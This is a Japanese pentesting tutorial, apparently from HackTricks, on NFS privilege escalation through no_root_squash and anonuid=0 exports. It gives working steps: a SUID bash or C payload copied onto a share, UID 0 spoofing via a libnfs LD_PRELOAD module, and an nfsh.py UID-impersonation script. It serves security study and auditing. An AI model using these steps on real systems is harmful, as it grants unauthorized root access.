# NFS No Root Squash Misconfigurationによる権限昇格

{{#include ../../banners/hacktricks-training.md}}

## Squashingの基本情報

NFS AUTH_SYS/AUTH_UNIXでは、サーバーは各RPCリクエストで指定された`uid`と`gid`に基づいてファイル権限をチェックします。Kerberosなどの他のセキュリティフレーバーでは異なる認証情報が使用され、権限チェックの前にサーバーが数値の認証情報をマッピングすることがあります。<sup>[[4]](#references)[[5]](#references)</sup>

- **`all_squash`**: すべてのUIDとGIDを匿名アカウントにマッピングします。Linuxではデフォルトで`nobody`（65534）です。`no_all_squash`はroot以外のリクエストに対するデフォルトです。<sup>[[4]](#references)</sup>
- **`root_squash`**: Linuxでのデフォルト設定で、UID/GID 0（root）のリクエストを匿名アカウントにマッピングします。それ以外のUIDとGIDはsquashされません。<sup>[[4]](#references)</sup>
- **`no_root_squash`**: root squashingを無効にするため、UID/GID 0のリクエストはサーバー上でrootとして評価されます。<sup>[[4]](#references)</sup>

許可されたクライアントが、**`no_root_squash`**で設定された書き込み可能なエクスポートを**`/etc/exports`**からマウントできる場合、そのUID/GID 0のリクエストはサーバーのrootユーザーとして書き込みできます。<sup>[[4]](#references)</sup>

`root_squash`が再マッピングするのはUID/GID 0のみです。AUTH_SYSでは、許可されたクライアントの**ゼロ以外の数値UID/GID**が、サーバー上の別のアカウントと一致することがあります。そのため、クライアントがその数値IDでファイルを作成でき、サーバーがアクセスを許可する場合、root squashingが有効でも、書き込み可能なエクスポートがユーザー間の侵入経路になる可能性があります。SUID/SGIDによる引き渡しでは、生成されるファイルの所有者、実行権限、サーバー側マウントの`nosuid`状態、ACL、SELinuxなどのポリシーも確認してください。エクスポートされたパス名や`rw`オプション、あるいは数値の一致だけでは、クライアントにアクセスが許可されていること、エクスポートが有効であること、または両ホストで実効的なIDマッピングが同じであることは証明できません。列挙時は`/etc/exports`とローカルのメタデータを受動的に確認してください。新しい共有をマウントしたり、テストファイルを作成したりしないでください。<sup>[[4]](#references)[[5]](#references)</sup>

**NFS**の詳細については、以下を確認してください。

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## 権限昇格

### root相当の匿名マッピング

`no_root_squash`だけを確認しないでください。`root_squash,anonuid=0,anongid=0`の場合、クライアントのUID/GID 0のリクエストはsquashされた**後にrootへ戻されます**。`all_squash,anonuid=0,anongid=0`の場合は、root以外のクライアントIDもすべてサーバー上でrootにマッピングされます。書き込み可能な`sec=sys`エクスポートでは、どちらの設定でも、以下のSUIDによる引き渡しで使われるroot所有ファイルを作成できる可能性があります。ただし、許可されたクライアントや被害ホスト側のマウントに関する制約は引き続き適用されます。<sup>[[4]](#references)</sup>

サーバー上で`exportfs -v`を使い、有効なエクスポートと、**該当するクライアント**に適用されるオプション（`rw`、`sec=`、squashモード、`anonuid`/`anongid`など）を確認してください。また、設定を確認する際は`/etc/exports.d/*.exports`も調べてください。`/etc/exports`だけでは情報が不完全な場合があります。<sup>[[4]](#references)[[6]](#references)</sup>

```bash
# Example /etc/exports entries: squashed requests map to server UID 0
/srv/share 192.0.2.10(rw,sec=sys,root_squash,anonuid=0,anongid=0)
/srv/share 192.0.2.11(rw,sec=sys,all_squash,anonuid=0,anongid=0)
```

### Remote Exploit

Option 1 using bash:
- 許可されたクライアントで、書き込み可能な export を root として mount し、**`/bin/bash`** をコピーして **SUID** bit を設定し、`nosuid` を使用していない victim mount から実行します。<sup>[[2]](#references)[[4]](#references)</sup>
    - アップロードしたファイルの所有者を root のままにするには、サーバーが **`no_root_squash`** でクライアントの UID 0 を維持するか、**`anonuid=0`** でリクエストを UID 0 にマッピングする必要があります。そうでない場合、別アカウント用の SUID binary を作成できるのは、クライアントがそのアカウントの数値 UID/GID でファイルを作成または所有できる場合に限られます。<sup>[[4]](#references)</sup>

```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```

Option 2：コンパイル済みのCコードを使用する:
- 許可されたクライアントからディレクトリをマウントし、SUID権限を悪用するコンパイル済みpayloadをコピーして、**SUID**ビットを設定し、victim上で実行します（[C SUID payloads](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)を参照）。
    - 前述と同じ制限があります。

```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```

### Local Exploit

> [!TIP]
> マシンから被害マシンへの**トンネルを作成できる場合、必要なポートをトンネリングすることで、Remote versionを使ってこの権限昇格を引き続き悪用できます**。\
> 次の手法は、`/etc/exports`でエクスポートが被害マシンのIPに制限されている場合に有効です。リモートクライアントからはマウントできませんが、ローカル手法では、許可されたホストですでにマウントされている共有を介して操作できます。<sup>[[2]](#references)</sup>\
> この非特権のlibnfs方式では、プロセスが予約されていない送信元ポートを使用できるよう、**`/etc/exports`**のエクスポートに`insecure`フラグを指定する必要があります。`secure`がデフォルトですが、予約済みポートにバインドできるプロセスにはこのオプションは不要です。<sup>[[1]](#references)[[4]](#references)</sup>

### 基本情報

NFSv3 AUTH_UNIXクライアントは、各呼び出しに実効UID、GID、グループを含め、サーバーはそれらを権限チェックに使用します。このローカル手法は、[libnfs](https://github.com/sahlberg/libnfs)を通じてRPC認証情報を偽装し、この仕組みを悪用します。そのpreloadモジュールでは、NFSコンテキストのUID/GIDをオーバーライドできます。<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>

#### ライブラリのコンパイル

libnfsのサンプルは、対象のカーネルに合わせて調整が必要な場合があります。ここで紹介する手順では、preloadモジュールをコンパイルする前にfallocateシステムコールをコメントアウトするよう明記されています。<sup>[[1]](#references)[[2]](#references)</sup>

```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```

#### Exploitの実行

この例では、shellを起動する小さなC helperを作成し、それをshareに配置して、NFS contextでUID 0の`ld_nfs.so`を使い、SUID-rootにします。<sup>[[1]](#references)[[2]](#references)</sup>

1. **Exploit codeをコンパイルする:**

```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **shareにexploitを配置し、UIDを偽装して権限を変更する**。<sup>[[1]](#references)[[2]](#references)</sup>

```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **exploitを実行してroot権限を取得する**。<sup>[[2]](#references)</sup>

```bash
/mnt/share/a.out
#root
```

### おまけ: ステルス性の高いファイルアクセスのための NFShell

rootアクセスを取得したら、この `nfsh.py` のパターンではコマンドを実行する前に実効UIDを対象ファイルのUIDに設定するため、所有権を再帰的に変更せずにアクセスできます。<sup>[[2]](#references)</sup>

```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
    try:
        uid = os.stat(filepath).st_uid
    except OSError as e:
        return get_file_uid(os.path.dirname(filepath))
    return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```

次のように実行します:

```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```



## References

- [1] [lnv42/libnfs](https://github.com/lnv42/libnfs)
- [2] [あまり知られていないNFS権限昇格の話](https://www.errno.fr/nfs_privesc.html)
- [3] [sahlberg/libnfs](https://github.com/sahlberg/libnfs)
- [4] [exports(5) — Linuxマニュアルページ](https://man7.org/linux/man-pages/man5/exports.5.html)
- [5] [RFC 1813: NFS Version 3プロトコル仕様](https://datatracker.ietf.org/doc/html/rfc1813)
- [6] [exportfs(8) — Linuxマニュアルページ](https://man7.org/linux/man-pages/man8/exportfs.8.html)
{{#include ../../banners/hacktricks-training.md}}
